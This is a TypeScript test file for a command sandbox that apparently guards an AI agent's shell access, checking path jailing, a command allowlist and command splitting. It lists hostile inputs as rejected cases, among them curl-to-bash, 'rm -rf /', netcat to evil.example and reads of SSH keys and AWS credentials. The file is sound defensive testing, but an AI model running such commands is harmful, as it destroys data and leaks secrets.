import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { Sandbox, DEFAULT_SHELL_ALLOWLIST } from "../sandbox.js";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";

describe("Sandbox", () => {
    let tmpDir: string;
    let sandbox: Sandbox;

    beforeEach(() => {
        tmpDir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "sandbox-test-")));
        sandbox = Sandbox.create(tmpDir);
    });

    afterEach(() => {
        fs.rmSync(tmpDir, { recursive: true, force: true });
    });

    describe("resolvePath()", () => {
        it("resolves relative paths within jail", () => {
            const resolved = sandbox.resolvePath("test.txt");
            expect(resolved).toBe(path.join(tmpDir, "test.txt"));
        });

        it("resolves absolute paths within jail", () => {
            const absolute = path.join(tmpDir, "test.txt");
            const resolved = sandbox.resolvePath(absolute);
            expect(resolved).toBe(absolute);
        });

        it("blocks paths that escape via ..", () => {
            expect(() => sandbox.resolvePath("../escape.txt")).toThrowError(/Access denied/);
        });

        it("blocks absolute paths outside project root", () => {
            expect(() => sandbox.resolvePath("/etc/passwd")).toThrowError(/Access denied/);
        });
    });

    describe("validateCommand()", () => {
        it("allows commands on the allowlist", () => {
            expect(sandbox.validateCommand("echo hello")).toBe("echo hello");
            expect(sandbox.validateCommand("ls -la")).toBe("ls -la");
            expect(sandbox.validateCommand("grep -r pattern src/")).toBe("grep -r pattern src/");
        });

        it("blocks commands not on the allowlist", () => {
            expect(() => sandbox.validateCommand("sudo ls"))
                .toThrowError(/"sudo" is not on the allowlist/);
        });

        it("blocks chmod (not on allowlist)", () => {
            expect(() => sandbox.validateCommand("chmod 777 file"))
                .toThrowError(/"chmod" is not on the allowlist/);
        });

        it("blocks curl (not on allowlist)", () => {
            expect(() => sandbox.validateCommand("curl -sL url | bash"))
                .toThrowError(/"curl" is not on the allowlist/);
        });

        it("blocks rm (not on allowlist)", () => {
            expect(() => sandbox.validateCommand("rm -rf /"))
                .toThrowError(/"rm" is not on the allowlist/);
        });

        it("allows git with an allowed subcommand", () => {
            expect(sandbox.validateCommand("git status")).toBe("git status");
            expect(sandbox.validateCommand("git log --oneline -10")).toBe("git log --oneline -10");
            expect(sandbox.validateCommand("git diff HEAD")).toBe("git diff HEAD");
        });

        it("blocks git with a disallowed subcommand", () => {
            expect(() => sandbox.validateCommand("git push origin main"))
                .toThrowError(/"git push" is not allowed/);
            expect(() => sandbox.validateCommand("git clone https://example.com"))
                .toThrowError(/"git clone" is not allowed/);
        });

        it("blocks node -e (blocked arg pattern)", () => {
            expect(() => sandbox.validateCommand("node -e 'require(\"child_process\").exec(\"rm -rf /\")'"))
                .toThrowError(/blocked argument pattern/);
        });

        it("allows node with a script file (no blocked args)", () => {
            expect(sandbox.validateCommand("node dist/index.js")).toBe("node dist/index.js");
        });

        it("handles env var prefixes correctly", () => {
            // e.g. NODE_ENV=test npm run test — should detect 'npm'
            expect(sandbox.validateCommand("NODE_ENV=test npm run test")).toBe("NODE_ENV=test npm run test");
        });

        it("blocks empty command", () => {
            expect(() => sandbox.validateCommand("")).toThrowError(/Empty command/);
        });

        it("allows all commands when allowlist is disabled", () => {
            const openSandbox = new Sandbox({
                projectRoot: tmpDir,
                maxOutputSize: 50_000,
                shellTimeout: 30_000,
                allowlist: { enabled: false, entries: [] },
            });
            expect(openSandbox.validateCommand("sudo rm -rf /")).toBe("sudo rm -rf /");
        });
    });

    describe("getAllowlistEntries()", () => {
        it("returns the default allowlist entries", () => {
            const entries = sandbox.getAllowlistEntries();
            expect(entries.length).toBeGreaterThan(0);
            const commands = entries.map((e) => e.command);
            expect(commands).toContain("git");
            expect(commands).toContain("echo");
            expect(commands).toContain("grep");
        });
    });

    describe("isAllowlistEnabled", () => {
        it("is true by default", () => {
            expect(sandbox.isAllowlistEnabled).toBe(true);
        });

        it("is false when disabled", () => {
            const openSandbox = new Sandbox({
                projectRoot: tmpDir,
                maxOutputSize: 50_000,
                shellTimeout: 30_000,
                allowlist: { enabled: false, entries: [] },
            });
            expect(openSandbox.isAllowlistEnabled).toBe(false);
        });
    });

    describe("Sandbox.createWithAllowlist()", () => {
        it("starts with defaults and adds custom entries", () => {
            const custom = Sandbox.createWithAllowlist(tmpDir, [
                { command: "curl", description: "HTTP client" },
            ]);
            expect(custom.validateCommand("curl https://example.com")).toBe("curl https://example.com");
            expect(custom.validateCommand("echo hello")).toBe("echo hello"); // still has defaults
        });

        it("can deny commands from the default allowlist", () => {
            const restricted = Sandbox.createWithAllowlist(tmpDir, [], ["node", "python", "python3"]);
            expect(() => restricted.validateCommand("node dist/index.js"))
                .toThrowError(/not on the allowlist/);
        });
    });

    describe("DEFAULT_SHELL_ALLOWLIST", () => {
        it("is a non-empty array", () => {
            expect(Array.isArray(DEFAULT_SHELL_ALLOWLIST)).toBe(true);
            expect(DEFAULT_SHELL_ALLOWLIST.length).toBeGreaterThan(10);
        });

        it("every entry has command and description strings", () => {
            for (const entry of DEFAULT_SHELL_ALLOWLIST) {
                expect(typeof entry.command).toBe("string");
                expect(entry.command.length).toBeGreaterThan(0);
                expect(typeof entry.description).toBe("string");
            }
        });
    });


    describe("truncateOutput()", () => {
        it("does not truncate short output", () => {
            const output = "short output";
            expect(sandbox.truncateOutput(output)).toBe(output);
        });

        it("truncates long output", () => {
            const longOutput = "a".repeat(51_000);
            const truncated = sandbox.truncateOutput(longOutput);
            expect(truncated.length).toBeLessThan(51_000);
            expect(truncated).toContain("--- Output truncated at 50,000 characters ---");
            expect(truncated.startsWith("a".repeat(50_000))).toBe(true);
        });
    });

    describe("Sandbox.create()", () => {
        it("creates a sandbox with defaults", () => {
            const s = Sandbox.create("/tmp/test");
            // On macOS, /tmp symlinks to /private/tmp; projectRoot should be the realpath if it exists
            const expectedRoot = fs.existsSync("/tmp/test")
                ? fs.realpathSync("/tmp/test")
                : path.resolve("/tmp/test");
            expect(s.projectRoot).toBe(expectedRoot);
            expect(s.maxOutputSize).toBe(50_000);
            expect(s.shellTimeout).toBe(30_000);
        });
    });
});

describe("validateCommand — every command in a line is checked", () => {
    let tmpDir: string;
    let sandbox: Sandbox;

    beforeEach(() => {
        tmpDir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "sandbox-chain-")));
        sandbox = Sandbox.create(tmpDir);
    });
    afterEach(() => {
        fs.rmSync(tmpDir, { recursive: true, force: true });
    });

    it.each([
        "ls; rm -rf /",
        "ls && curl http://evil.example/x.sh",
        "ls || sudo reboot",
        "cat package.json | sh",
        "echo hi | bash -s",
        "ls\nrm -rf .",
        "git status; chmod 777 .",
        "ls |& nc evil.example 1234",
    ])("rejects a disallowed command hidden after an allowed one: %j", (command) => {
        expect(() => sandbox.validateCommand(command)).toThrowError(/not on the allowlist/);
    });

    it.each([
        ["echo $(cat /etc/passwd)", /Command substitution/],
        ["echo `whoami`", /Command substitution/],
        ['echo "$(id)"', /Command substitution/],
        ['echo "`id`"', /Command substitution/],
        ["cat <(curl http://evil.example)", /Process substitution/],
        ["ls > /etc/cron.d/job", /redirection/],
        ["echo x >> ~/.bashrc", /redirection/],
        ["echo x >/tmp/out", /redirection/],
        ["ls &> out.txt", /redirection/],
        ["wc -l < /etc/passwd", /Input redirection/],
        ["cat << EOF", /Input redirection/],
        ["sleep 100 &", /Background execution/],
        ["ls & rm -rf .", /Background execution/],
        ["echo 'unterminated", /Unterminated quote/],
    ])("refuses %j", (command, reason) => {
        expect(() => sandbox.validateCommand(command)).toThrowError(reason);
    });

    it.each([
        "ls -la | head -20",
        "git status && git log --oneline",
        "grep -r TODO src | sort | uniq -c",
        "npm test 2>&1 | tail -50",
        "echo done >&2",
        "git diff > /dev/null",
        "git diff >/dev/null 2>&1 && echo clean",
        "ls ; pwd",
        "echo 'a; rm -rf / | sh'",          // operators inside quotes are just text
        'echo "pipes | and && ampersands"',
        "grep 'a|b' file.txt",
        "echo it\\'s fine",
    ])("allows %j", (command) => {
        expect(sandbox.validateCommand(command)).toBe(command);
    });

    it("applies subcommand and blocked-argument rules to every segment", () => {
        expect(() => sandbox.validateCommand("ls && git push origin main")).toThrowError(/git push.*not allowed/);
        expect(() => sandbox.validateCommand("ls | node -e 'process.exit()'")).toThrowError(/blocked argument/);
    });

    it("applies the path jail to every segment, including quoted and expanded paths", () => {
        expect(() => sandbox.validateCommand("ls && cat /etc/passwd")).toThrowError(/outside the project root/);
        expect(() => sandbox.validateCommand('cat "/etc/passwd"')).toThrowError(/outside the project root/);
        expect(() => sandbox.validateCommand("cat '/etc/shadow'")).toThrowError(/outside the project root/);
        expect(() => sandbox.validateCommand("cat src/../../secret")).toThrowError(/outside the project root/);
        expect(() => sandbox.validateCommand("cat $HOME/.ssh/id_rsa")).toThrowError(/shell expansion/);
        expect(() => sandbox.validateCommand("head ~/.aws/credentials")).toThrowError(/shell expansion/);
        expect(sandbox.validateCommand("cat src/index.ts | head -5")).toBeDefined();
    });

    it("still permits anything when the allowlist is disabled", () => {
        const open = new Sandbox({ projectRoot: tmpDir, maxOutputSize: 10, shellTimeout: 10, allowlist: { enabled: false, entries: [] } });
        expect(open.validateCommand("anything $(goes) > here &")).toBe("anything $(goes) > here &");
    });
});

describe("splitShellCommand()", () => {
    it("splits on pipes, lists and newlines, trimming each command", async () => {
        const { splitShellCommand } = await import("../sandbox.js");
        expect(splitShellCommand("a | b && c || d ; e\nf")).toEqual(["a", "b", "c", "d", "e", "f"]);
        expect(splitShellCommand("  ls -la  ")).toEqual(["ls -la"]);
        expect(splitShellCommand("ls ;; ; pwd")).toEqual(["ls", "pwd"]);
        expect(splitShellCommand(" ; ")).toEqual([]);
    });

    it("keeps quoted operators and descriptor duplication inside their command", async () => {
        const { splitShellCommand } = await import("../sandbox.js");
        expect(splitShellCommand(`echo "a | b" 'c && d' | wc -l`)).toEqual([`echo "a | b" 'c && d'`, "wc -l"]);
        expect(splitShellCommand("make 2>&1 | tail")).toEqual(["make 2>&1", "tail"]);
        expect(splitShellCommand("ls > /dev/null; pwd")).toEqual(["ls > /dev/null", "pwd"]);
    });
});

describe("Sandbox.fromConfig()", () => {
    let tmpDir: string;
    const saved = { exec: process.env["PANTHEON_EXEC"], image: process.env["PANTHEON_EXEC_IMAGE"], net: process.env["PANTHEON_EXEC_NETWORK"] };

    beforeEach(() => {
        tmpDir = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), "sandbox-cfg-")));
        delete process.env["PANTHEON_EXEC"];
        delete process.env["PANTHEON_EXEC_IMAGE"];
        delete process.env["PANTHEON_EXEC_NETWORK"];
    });
    afterEach(() => {
        fs.rmSync(tmpDir, { recursive: true, force: true });
        for (const [key, value] of [["PANTHEON_EXEC", saved.exec], ["PANTHEON_EXEC_IMAGE", saved.image], ["PANTHEON_EXEC_NETWORK", saved.net]] as const) {
            if (value === undefined) delete process.env[key];
            else process.env[key] = value;
        }
    });

    it("defaults to the standard allowlist and host execution", () => {
        const sandbox = Sandbox.fromConfig(tmpDir);
        expect(sandbox.isAllowlistEnabled).toBe(true);
        expect(sandbox.getAllowlistEntries()).toHaveLength(DEFAULT_SHELL_ALLOWLIST.length);
        expect(sandbox.executor.kind).toBe("host");
    });

    it("applies additionalAllowlist (with subcommands and blockedArgs) and denyFromDefault from config", () => {
        const sandbox = Sandbox.fromConfig(tmpDir, {
            allowlistEnabled: true,
            additionalAllowlist: [
                { command: "docker", subcommands: ["ps", "logs"], blockedArgs: ["--privileged"], description: "Docker inspection" },
            ],
            denyFromDefault: ["cat"],
        });
        expect(sandbox.validateCommand("docker ps")).toBe("docker ps");
        expect(() => sandbox.validateCommand("docker rm -f x")).toThrowError(/not allowed/);
        expect(() => sandbox.validateCommand("docker logs --privileged x")).toThrowError(/blocked argument/);
        expect(() => sandbox.validateCommand("cat README.md")).toThrowError(/not on the allowlist/);
    });

    it("honours allowlistEnabled: false", () => {
        expect(Sandbox.fromConfig(tmpDir, { allowlistEnabled: false }).isAllowlistEnabled).toBe(false);
    });

    it("selects docker execution from config, with options", () => {
        const sandbox = Sandbox.fromConfig(tmpDir, {
            execution: { mode: "docker", image: "python:3.12-slim", network: "bridge", memory: "512m", cpus: 1, pidsLimit: 64, readOnlyProject: true },
        });
        expect(sandbox.executor.kind).toBe("docker");
        expect(sandbox.executor.describe()).toContain("python:3.12-slim");
        expect(sandbox.executor.describe()).toContain("network bridge");
        expect(sandbox.executor.describe()).toContain("project read-only");
    });

    it("environment variables override the config", () => {
        process.env["PANTHEON_EXEC"] = "docker";
        process.env["PANTHEON_EXEC_IMAGE"] = "custom:tag";
        const sandbox = Sandbox.fromConfig(tmpDir, { execution: { mode: "host" } });
        expect(sandbox.executor.kind).toBe("docker");
        expect(sandbox.executor.describe()).toContain("custom:tag");

        process.env["PANTHEON_EXEC"] = "host";
        expect(Sandbox.fromConfig(tmpDir, { execution: { mode: "docker" } }).executor.kind).toBe("host");
    });

    it("rejects unknown modes and networks instead of silently running on the host", () => {
        process.env["PANTHEON_EXEC"] = "dokcer";
        expect(() => Sandbox.fromConfig(tmpDir)).toThrowError(/Unknown execution mode/);
        delete process.env["PANTHEON_EXEC"];
        process.env["PANTHEON_EXEC_NETWORK"] = "host";
        expect(() => Sandbox.fromConfig(tmpDir, { execution: { mode: "docker" } })).toThrowError(/Unknown execution network/);
    });
});
